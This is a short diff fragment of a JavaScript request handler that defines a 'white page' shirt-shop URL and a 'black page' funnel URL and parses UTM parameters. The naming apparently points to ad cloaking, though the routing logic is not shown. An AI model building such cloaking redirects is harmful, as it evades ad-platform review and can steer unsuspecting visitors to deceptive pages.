@@ -2,7 +2,7 @@ export default function handler(req, res) {
     // URLs to redirect
     const whitePageURL = "https://www.kickitshirts.com/product/liverpool-home-shirt-2024-25/";
     const blackPageURL = "https://iid0dcaoqjzw12.myfunnelish.com/imbassd-1736113436951513";
-  
+
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
     const utmCampaign = queryParams.get('utm_campaign');
